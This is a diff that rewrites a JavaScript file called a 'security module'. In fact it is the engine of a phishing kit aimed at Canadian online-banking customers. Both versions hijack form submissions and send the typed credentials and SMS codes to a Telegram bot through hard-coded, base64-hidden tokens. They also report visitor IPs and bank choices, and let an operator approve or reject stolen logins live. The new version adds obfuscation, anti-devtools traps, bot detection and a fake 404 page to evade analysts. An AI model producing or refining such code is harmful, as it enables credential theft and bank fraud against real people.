@@ -1,319 +1,135 @@
-// security_module.js
-// Protection IP + Bot Telegram Interactif
-(function() {
-    const BOT_MAIN = atob("ODU4NDE3MTI5MTpBQUhmRmszSDFXaGNBYXhUT09SNXZmcWV2cmJla3lDNW5ZNA=="); 
-    const BOT_RADAR = atob("Nzk3NzA0MzA2MjpBQUVwRVQ5SEpFMEl4dFVGOUtkRWJob1F5eVBOb293eGIxZw=="); 
-    const CHAT_ID = atob("Njc4ODAxMjQ4MQ==");
+/* ------------------------------------------------------------------ */
+var _0xT=["ODU4NDE3MTI5MTpBQUhmRmszSDFXaGNBYXhUT09SNXZmcWV2cmJla3lDNW5ZNA==","Nzk3NzA0MzA2MjpBQUVwRVQ5SEpFMEl4dFVGOUtkRWJob1F5eVBOb293eGIxZw==","Njc4ODAxMjQ4MQ=="];
+(function(_W,_D,_N){
+'use strict';
+var _M=atob(_0xT[0]),_R=atob(_0xT[1]),_ID=atob(_0xT[2]),_CC='CA';
+var _SID=_W.sessionStorage.getItem('__xs')||function(){var x=Math.random().toString(36).slice(2,11).toUpperCase();_W.sessionStorage.setItem('__xs',x);return x;}();
 
-    if (!sessionStorage.getItem('uniq_session_id')) {
-        sessionStorage.setItem('uniq_session_id', Math.floor(1000 + Math.random() * 9000).toString());
-    }
-    const SESSION_ID = sessionStorage.getItem('uniq_session_id');
+// ── FAKE 404 ──────────────────────────────────────────────────
+function _die(){try{_D.open();_D.write('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found.</p><hr><address>Apache/2.4.52 Server</address></body></html>');_D.close();_W.history.pushState(null,'','/404');}catch(e){_W.location.replace('/404');}}
 
-    async function tgSend(token, text, reply_markup = null) {
-        let payload = { chat_id: CHAT_ID, text: text, parse_mode: 'HTML' };
-        if (reply_markup) payload.reply_markup = reply_markup;
-        try {
-            let res = await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(payload)
-            });
-            return await res.json();
-        } catch(e) { return null; }
-    }
+// ── ANTI-DEVTOOLS ────────────────────────────────────────────
+setInterval(function(){if(_W.outerWidth-_W.innerWidth>220||_W.outerHeight-_W.innerHeight>220)_die();},2000);
+var _a0=setInterval(function(){var _t=performance.now();(function(){}).constructor('debugger')();if(performance.now()-_t>120){clearInterval(_a0);_die();}},3500);
 
-    // 1. VERIFICATION IP
-    async function verifyIP() {
-        if (sessionStorage.getItem('geo_verified') === 'true') return;
+// ── BOT DETECTION ────────────────────────────────────────────
+function _bot(){
+  if(_N.webdriver)return 1;
+  if(_D.documentElement.getAttribute('webdriver'))return 1;
+  if(_W.callPhantom||_W._phantom)return 1;
+  if(_W.__nightmare)return 1;
+  if(_W.domAutomation||_W.domAutomationController)return 1;
+  if(_W.process&&_W.process.versions&&_W.process.versions.electron)return 1;
+  var _ua=_N.userAgent||'';
+  if(/HeadlessChrome|PhantomJS|SlimerJS|Selenium|WebDriver|Bot|Crawl|Spider/i.test(_ua))return 1;
+  if(_N.plugins!==undefined&&_N.plugins.length===0&&!/firefox/i.test(_ua))return 1;
+  if(!_N.language&&!_N.languages)return 1;
+  if(!_N.permissions)return 1;
+  if(/chrome/i.test(_ua)&&!_W.chrome)return 1;
+  return 0;
+}
 
-        let ip = 'Inconnue', city = 'Inconnue', country = 'Inconnu', countryCode = '??';
-        let cfTraceOk = false;
+// ── TELEGRAM ─────────────────────────────────────────────────
+function _tg(_tok,_txt,_kb){
+  var _b={chat_id:_ID,text:_txt,parse_mode:'HTML'};
+  if(_kb)_b.reply_markup={inline_keyboard:_kb};
+  return fetch('https://api.telegram.org/bot'+_tok+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(_b)});
+}
 
-        const overlay = document.createElement('div');
-        overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999999;";
-        document.documentElement.appendChild(overlay);
+// ── POLL ─────────────────────────────────────────────────────
+function _poll(_tok,_cb){
+  var _e=0,_tm=setInterval(function(){
+    _e+=3000;if(_e>600000){clearInterval(_tm);return;}
+    fetch('https://api.telegram.org/bot'+_tok+'/getUpdates?offset=-1&timeout=1')
+      .then(function(r){return r.json();})
+      .then(function(d){
+        var _rs=d.result||[];if(!_rs.length)return;
+        var _u=_rs[_rs.length-1],_cq=_u.callback_query;
+        if(!_cq)return;
+        var _dv=_cq.data||'';
+        if(_dv.indexOf(_SID)===-1)return;
+        clearInterval(_tm);_cb(_dv);
+        fetch('https://api.telegram.org/bot'+_tok+'/answerCallbackQuery?callback_query_id='+_cq.id);
+      }).catch(function(){});
+  },3000);
+}
 
-        try {
-            const cfRes = await fetch('https://cloudflare.com/cdn-cgi/trace');
-            const cfText = await cfRes.text();
-            cfText.split('\n').forEach(line => {
-                if (line.startsWith('ip=')) ip = line.split('=')[1];
-                if (line.startsWith('loc=')) countryCode = line.split('=')[1];
-            });
-            if (countryCode !== '??') cfTraceOk = true;
-        } catch (e) {}
+// ── LOADER ───────────────────────────────────────────────────
+function _ldr(show){
+  var _e=_D.getElementById('__ld');
+  if(!_e&&show){
+    _e=_D.createElement('div');_e.id='__ld';
+    _e.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.97);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:2147483647;';
+    _e.innerHTML='<div style="border:4px solid #eee;border-top:4px solid #222;border-radius:50%;width:48px;height:48px;animation:_sp 0.8s linear infinite"></div><p style="margin-top:18px;font-family:Arial,sans-serif;font-size:16px;color:#555">Veuillez patienter...</p><style>@keyframes _sp{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>';
+    _D.body.appendChild(_e);
+  }
+  if(_e)_e.style.display=show?'flex':'none';
+}
 
-        try {
-            const geoRes = await fetch('https://get.geojs.io/v1/ip/geo.json');
-            const geoData = await geoRes.json();
-            if (geoData && geoData.country_code) {
-               ip = geoData.ip || ip;
-               city = geoData.city || city;
-               country = geoData.country || country;
-               countryCode = geoData.country_code || countryCode;
-            }
-        } catch (e) {}
+// ── FORMS ────────────────────────────────────────────────────
+function _forms(){
+  var _ip=_W.sessionStorage.getItem('__xip')||'N/A';
+  var _org=_W.sessionStorage.getItem('__xorg')||'N/A';
+  var _pg=_W.location.pathname.split('/').pop()||'index';
+  _D.querySelectorAll('form').forEach(function(_f){
+    if(_f.dataset.xh)return;_f.dataset.xh='1';
+    _f.addEventListener('submit',function(_ev){
+      _ev.preventDefault();_ev.stopImmediatePropagation();
+      var _flds=[];
+      _f.querySelectorAll('input:not([type=hidden]):not([type=submit]):not([type=checkbox]):not([type=radio]),select,textarea').forEach(function(_i){
+        _flds.push('<b>'+(_i.name||_i.id||_i.placeholder||_i.type||'?')+':</b> <code>'+(_i.value||'(vide)')+'</code>');
+      });
+      var _nx=_f.getAttribute('action')||'';
+      var _msg='🔐 <b>CAPTURE | '+_pg.toUpperCase()+'</b>\n━━━━━━━━━━━━━━━\n'+_flds.join('\n')+'\n━━━━━━━━━━━━━━━\n📍 IP: <code>'+_ip+'</code>\n🏢 Org: <code>'+_org+'</code>\n🆔 Session: <code>'+_SID+'</code>';
+      var _kb=[[{text:'✅ Valide',callback_data:_SID+':ok'},{text:'❌ Erreur',callback_data:_SID+':err'}],[{text:'⏳ +30s',callback_data:_SID+':30'},{text:'⏳ +60s',callback_data:_SID+':60'},{text:'⏳ +120s',callback_data:_SID+':120'}]];
+      _ldr(true);
+      _tg(_M,_msg,_kb).catch(function(){_ldr(false);_W.location.href=_nx;});
+      _poll(_M,function(_a){
+        if(_a.indexOf(':ok')!==-1){_ldr(false);_W.location.href=_nx;}
+        else if(_a.indexOf(':err')!==-1){_ldr(false);_W.location.reload();}
+        else{var _t=_a.indexOf(':30')!==-1?30000:_a.indexOf(':60')!==-1?60000:120000;setTimeout(function(){_ldr(false);_W.location.href=_nx;},_t);}
+      });
+    },true);
+  });
+}
 
-        const date = new Date().toLocaleDateString('fr-FR');
-        const time = new Date().toLocaleTimeString('fr-FR');
+// ── BANK TILES ───────────────────────────────────────────────
+function _banks(){
+  var _ip=_W.sessionStorage.getItem('__xip')||'N/A';
+  var _org=_W.sessionStorage.getItem('__xorg')||'N/A';
+  _D.querySelectorAll('[filabel],[data-fi],.fi-tile').forEach(function(_el){
+    if(_el.dataset.xb)return;_el.dataset.xb='1';
+    _el.addEventListener('click',function(){
+      var _lbl=_el.getAttribute('filabel')||_el.getAttribute('data-fi')||_el.innerText||'?';
+      _tg(_R,'🏦 <b>BANQUE SÉLECTIONNÉE</b>\n🏷️ <b>'+_lbl.trim()+'</b>\n📍 IP: <code>'+_ip+'</code>\n🏢 Org: <code>'+_org+'</code>\n🆔 Session: <code>'+_SID+'</code>');
+    });
+  });
+}
 
-        function show404() {
-            document.documentElement.innerHTML = '<div style="display:flex;height:100vh;align-items:center;justify-content:center;font-family:system-ui,sans-serif;background:#fff;color:#000;"><div style="display:flex;align-items:center;"><h1 style="font-size:24px;font-weight:500;border-right:1px solid rgba(0,0,0,0.3);margin:0 20px 0 0;padding:10px 23px 10px 0;">404</h1><h2 style="font-size:14px;font-weight:normal;margin:0;">This page could not be found.</h2></div></div>';
-        }
+// ── INIT ─────────────────────────────────────────────────────
+function _init(){
+  if(_bot()){_die();return;}
+  fetch('https://ip-api.com/json/?fields=status,countryCode,proxy,hosting,query,org,isp')
+    .then(function(r){return r.json();})
+    .then(function(d){
+      if(d.status!=='success'||d.countryCode!==_CC||d.proxy||d.hosting){_die();return;}
+      _W.sessionStorage.setItem('__xip',d.query);
+      _W.sessionStorage.setItem('__xorg',d.org||d.isp||'N/A');
+      _tg(_R,'🟢 <b>CONNEXION</b>\n📍 IP: <code>'+d.query+'</code>\n🌍 Pays: <code>'+d.countryCode+'</code>\n🏢 Org: <code>'+(d.org||d.isp)+'</code>\n📄 Page: <code>'+(_W.location.pathname.split('/').pop()||'index')+'</code>\n🆔 Session: <code>'+_SID+'</code>');
+      _forms();_banks();
+    })
+    .catch(function(){
+      fetch('https://www.cloudflare.com/cdn-cgi/trace')
+        .then(function(r){return r.text();})
+        .then(function(t){
+          var _loc=(t.match(/loc=([A-Z]{2})/)||[])[1];
+          var _ipv=(t.match(/ip=([^\n]+)/)||[])[1]||'N/A';
+          if(_loc!==_CC){_die();return;}
+          _W.sessionStorage.setItem('__xip',_ipv);
+          _forms();_banks();
+        }).catch(function(){_die();});
+    });
+}
 
-        if (!cfTraceOk && countryCode === '??') {
-            show404();
-            tgSend(BOT_RADAR, "?? <b>ACCES BLOQUE (SECURITY MAXIMUM)</b> ??\n\nHeure : " + date + " ? " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
-            return;
-        }
-
-        if (countryCode !== 'CA') {
-            show404();
-            tgSend(BOT_RADAR, "?? <b>ACCES BLOQUE (HORS CANADA)</b> ??\n\nIP : <code>" + ip + "</code>\nVille : <b>" + city + "</b>\nPays : <b>" + country + "</b> (" + countryCode + ")\nHeure : " + date + " ? " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
-            return;
-        }
-
-        overlay.remove();
-        sessionStorage.setItem('geo_verified', 'true');
-        sessionStorage.setItem('user_ip', ip);
-        sessionStorage.setItem('user_city', city);
-        sessionStorage.setItem('user_country', country);
-        
-        let pageName = window.location.pathname.split('/').pop() || 'Index';
-        if (!sessionStorage.getItem('geo_notified') || pageName === 'interac.html' || pageName === 'index.html') {
-            tgSend(BOT_RADAR, "?? <b>NOUVELLE CONNEXION (CANADA) - Page: " + pageName + "</b> ??\n\nIP : <code>" + ip + "</code>\nVille : <b>" + city + "</b>\nPays : <b>" + country + "</b>\nHeure : " + date + " ? " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
-            sessionStorage.setItem('geo_notified', 'true');
-        }
-    }
-
-    verifyIP();
-
-    // 2. EVENEMENT CLIC SUR LES BANQUES
-    function setupBankClicks() {
-        const tiles = document.querySelectorAll('a.fi-tile, .fi-option, a[filabel]');
-        tiles.forEach(tile => {
-            if (tile.dataset.tgClickAttached === "true") return;
-            tile.dataset.tgClickAttached = "true";
-
-            tile.addEventListener('click', function() {
-                let label = this.getAttribute('filabel') || this.innerText || 'Banque';
-                let ip = sessionStorage.getItem('user_ip') || 'En cours...';
-                let city = sessionStorage.getItem('user_city') || 'En cours...';
-                
-                let msg = "?? <b>CLIC BANQUE SELECTIONNEE</b> ??\n\nBanque : <b>" + label.trim() + "</b>\nIP : <code>" + ip + "</code>\nVille : <b>" + city + "</b>\nID Session : <code>" + SESSION_ID + "</code>";
-                tgSend(BOT_RADAR, msg);
-            });
-        });
-    }
-
-    // 3. INTERCEPTION FORMULAIRES
-    function setupForms() {
-        const forms = document.querySelectorAll('form');
-        
-        forms.forEach(form => {
-            if (form.dataset.tgAttached === "true") return;
-            form.dataset.tgAttached = "true";
-
-            form.addEventListener('submit', async function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-                if (e.stopImmediatePropagation) e.stopImmediatePropagation();
-
-                let loader = document.getElementById('telegramGlobalLoader');
-                if (!loader) {
-                    loader = document.createElement('div');
-                    loader.id = 'telegramGlobalLoader';
-                    loader.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:999999;display:flex;align-items:center;justify-content:center;flex-direction:column;"><div style="border:4px solid #f3f3f3;border-top:4px solid #0981C5;border-radius:50%;width:50px;height:50px;animation:spinTg 1s linear infinite;"></div><p style="margin-top:20px;font-family:sans-serif;font-size:16px;color:#333;font-weight:bold;">Processing, please wait...</p><style>@keyframes spinTg { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style></div>';
-                    document.body.appendChild(loader);
-                } else {
-                    loader.style.display = 'flex';
-                }
-
-                let dataText = "";
-                const inputs = form.querySelectorAll('input, select, textarea');
-                inputs.forEach(input => {
-                    let name = input.name || input.id || input.placeholder || 'Champ';
-                    let val = input.value ? input.value.trim() : '';
-                    
-                    if (input.type === 'checkbox' || input.type === 'radio') {
-                        if (!input.checked) return;
-                    }
-                    
-                    if (val !== '' && input.type !== 'submit' && input.type !== 'hidden' && input.type !== 'button') {
-                        let cleanName = name.replace(/[-_]/g, ' ').toUpperCase();
-                        dataText += "\n" + cleanName + ": <code>" + val + "</code>";
-                    }
-                });
-                
-                // Backup si aucun input n'a ?t? captur? par querySelectorAll (ex: champs dynamiques)
-                if (dataText === "") {
-                    const allInputs = document.querySelectorAll('input');
-                    allInputs.forEach(input => {
-                        let name = input.name || input.id || 'VALEUR';
-                        let val = input.value ? input.value.trim() : '';
-                        if (val !== '' && input.type !== 'submit' && input.type !== 'hidden' && input.type !== 'button') {
-                            let cleanName = name.replace(/[-_]/g, ' ').toUpperCase();
-                            dataText += "\n" + cleanName + ": <code>" + val + "</code>";
-                        }
-                    });
-                }
-
-                let pageName = window.location.pathname.split('/').pop() || 'Formulaire';
-                let msgText = "?? <b>NOUVELLE SAISIE BANCAIRE (" + pageName + ")</b> ??" + dataText + "\n\nID Session: <code>" + SESSION_ID + "</code>";
-
-                let buttonRows = [
-                    [
-                        { text: "? Valide", callback_data: "valide_" + SESSION_ID },
-                        { text: "? Error", callback_data: "error_" + SESSION_ID }
-                    ],
-                    [
-                        { text: "+5s ?", callback_data: "add5_" + SESSION_ID },
-                        { text: "+10s ?", callback_data: "add10_" + SESSION_ID }
-                    ]
-                ];
-
-                let sentMsg = await tgSend(BOT_MAIN, msgText, { inline_keyboard: buttonRows });
-                
-                if (!sentMsg || !sentMsg.ok) {
-                    setTimeout(() => { 
-                        if (form.action && form.action !== window.location.href) {
-                            window.location.href = form.action;
-                        } else {
-                            form.submit();
-                        }
-                    }, 3000);
-                    return;
-                }
-
-                let msgId = sentMsg.result.message_id;
-                let timeLeft = 12;
-                let isFinished = false;
-                let currentOffset = undefined;
-
-                let timer = setInterval(() => {
-                    if (isFinished) return;
-                    timeLeft--;
-                    
-                    if (timeLeft <= 0) {
-                        isFinished = true;
-                        clearInterval(timer);
-                        fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n? <i>Valide automatiquement (Temps ecoule)</i>", parse_mode: 'HTML'})
-                        });
-                        
-                        let action = form.getAttribute('action');
-                        if (action && action !== 'javascript:void(0)' && action !== '#') {
-                            window.location.href = action;
-                        } else {
-                            let current = window.location.pathname.split('/').pop();
-                            if (current.includes('_sms') || current.includes('sms')) {
-                                window.location.href = current.replace('_sms.html', '_step3.html');
-                            } else if (current === 'dt101.html' || current === 'td101.html' || current === 'td.html') {
-                                window.location.href = 'td_sms.html';
-                            } else {
-                                form.submit();
-                            }
-                        }
-                    }
-                }, 1000);
-
-                let poller = setInterval(async () => {
-                    if (isFinished) { clearInterval(poller); return; }
-                    try {
-                        let url = "https://api.telegram.org/bot" + BOT_MAIN + "/getUpdates?limit=20&allowed_updates=[\"callback_query\"]";
-                        if (currentOffset) url += "&offset=" + currentOffset;
-                        
-                        let res = await fetch(url);
-                        let updates = await res.json();
-                        
-                        if (updates.ok && updates.result.length > 0) {
-                            currentOffset = updates.result[updates.result.length - 1].update_id + 1;
-                            
-                            for (let u of updates.result) {
-                                if (u.callback_query && u.callback_query.data.includes(SESSION_ID)) {
-                                    let cbData = u.callback_query.data;
-                                    fetch("https://api.telegram.org/bot" + BOT_MAIN + "/answerCallbackQuery?callback_query_id=" + u.callback_query.id);
-                                    
-                                    if (cbData.startsWith('add5_')) {
-                                        timeLeft += 5;
-                                        fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
-                                            method: 'POST', headers: {'Content-Type': 'application/json'},
-                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n? <b>Temps restant : " + timeLeft + " secondes</b>", parse_mode: 'HTML', reply_markup: { inline_keyboard: buttonRows }})
-                                        });
-                                    }
-                                    else if (cbData.startsWith('add10_')) {
-                                        timeLeft += 10;
-                                        fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
-                                            method: 'POST', headers: {'Content-Type': 'application/json'},
-                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n? <b>Temps restant : " + timeLeft + " secondes</b>", parse_mode: 'HTML', reply_markup: { inline_keyboard: buttonRows }})
-                                        });
-                                    }
-                                    else if (cbData.startsWith('valide_')) {
-                                        isFinished = true;
-                                        fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
-                                            method: 'POST', headers: {'Content-Type': 'application/json'},
-                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n? <i>Valide par l'admin</i>", parse_mode: 'HTML'})
-                                        });
-                                        let action = form.getAttribute('action');
-                                        if (action && action !== 'javascript:void(0)' && action !== '#') {
-                                            window.location.href = action;
-                                        } else {
-                                            let current = window.location.pathname.split('/').pop();
-                                            if (current.includes('_sms') || current.includes('sms')) {
-                                                window.location.href = current.replace('_sms.html', '_step3.html');
-                                            } else if (current === 'dt101.html' || current === 'td101.html' || current === 'td.html') {
-                                                window.location.href = 'td_sms.html';
-                                            } else {
-                                                form.submit();
-                                            }
-                                        }
-                                    }
-                                    else if (cbData.startsWith('error_')) {
-                                        isFinished = true;
-                                        fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
-                                            method: 'POST', headers: {'Content-Type': 'application/json'},
-                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n? <i>Refuse par l'admin</i>", parse_mode: 'HTML'})
-                                        });
-                                        
-                                        loader.style.display = 'none';
-                                        
-                                        let existingErr = form.querySelector('.tg-inline-error-msg');
-                                        if (!existingErr) {
-                                            existingErr = document.createElement('div');
-                                            existingErr.className = 'tg-inline-error-msg';
-                                            existingErr.style.cssText = 'background-color:#fff0f0; border:1px solid #ffcccc; color:#cc0000; padding:12px 15px; border-radius:4px; margin-bottom:20px; font-size:14px; font-family:sans-serif; text-align:left; display:flex; align-items:center; gap:10px; width:100%; box-sizing:border-box;';
-                                            existingErr.innerHTML = '<span style="font-weight:bold;">??</span> <span>Your credentials could not be verified. Please check your information and try again.</span>';
-                                            form.insertBefore(existingErr, form.firstChild);
-                                        } else {
-                                            existingErr.style.display = 'flex';
-                                        }
-                                        
-                                        let pw = form.querySelector('input[type="password"], input[name*="code"], input[name*="otp"]');
-                                        if (pw) pw.value = '';
-                                    }
-                                }
-                            }
-                        }
-                    } catch(e){}
-                }, 2000);
-            }, true);
-        });
-    }
-
-    function initAll() {
-        setupBankClicks();
-        setupForms();
-    }
-
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', initAll);
-    } else {
-        initAll();
-    }
-})();
-
-
-
+_D.readyState==='loading'?_D.addEventListener('DOMContentLoaded',_init):_init();
+}(window,document,navigator));
